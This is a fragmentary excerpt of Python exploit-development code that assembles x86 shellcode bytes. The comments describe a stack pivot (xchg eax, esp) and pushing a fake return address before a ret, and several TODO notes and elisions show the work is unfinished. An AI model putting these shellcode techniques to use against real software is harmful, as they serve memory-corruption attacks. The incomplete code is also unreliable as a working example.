...
# TODO: make prolog function for maakafim
...
def push_al():
    ...
    shellcode += b'\x30\xd7\x94' # xchg eax, esp
...
def main():
    ...
    buf += b'\x30\xd7\x54\x30\xd7\x5f' # push esp; pop edi (mov edi, esp)
    ...
    buf += b'\x31\xd7\x51\x31\xd7\x5a'
    
    buf += b'\x31\xd7\x54\x31\xd6\xc3' # pushing fake return address onto the stack and the ret TODO: esp update before push or after??
